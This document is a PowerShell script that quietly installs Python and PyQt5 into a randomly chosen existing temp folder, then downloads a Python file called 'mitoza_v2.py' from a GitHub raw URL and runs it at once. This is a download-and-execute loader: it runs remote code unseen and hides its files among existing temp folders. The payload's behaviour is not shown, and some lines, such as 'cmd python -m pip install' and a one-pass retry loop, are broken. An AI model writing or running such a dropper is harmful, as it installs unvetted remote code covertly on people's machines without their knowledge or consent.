$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$irec=($pth[(Get-Random -Minimum 0 -Maximum ($pth | Measure-Object -Line).Lines)])
$direc = "$env:tmp\$irec"
try {
    python -V
}
catch {
    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\python-3.12.8-amd64.exe"
    Start-Process "$direc\python-3.12.8-amd64.exe" "/quiet","PrependPath=1"
    $a = 1
    while ($a -eq 1) {
        try {
            Start-Sleep -Seconds 2
            cmd python -m pip install pyqt5
        }
        finally {
            $a = 0 
        }
    }
}
finally {
    if ([bool]((python -m pip list) -like "*PyQt5*") -eq "") {
        python -m pip install PyQt5
    }
}

Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\mitoza.py"
python "$direc\mitoza.py"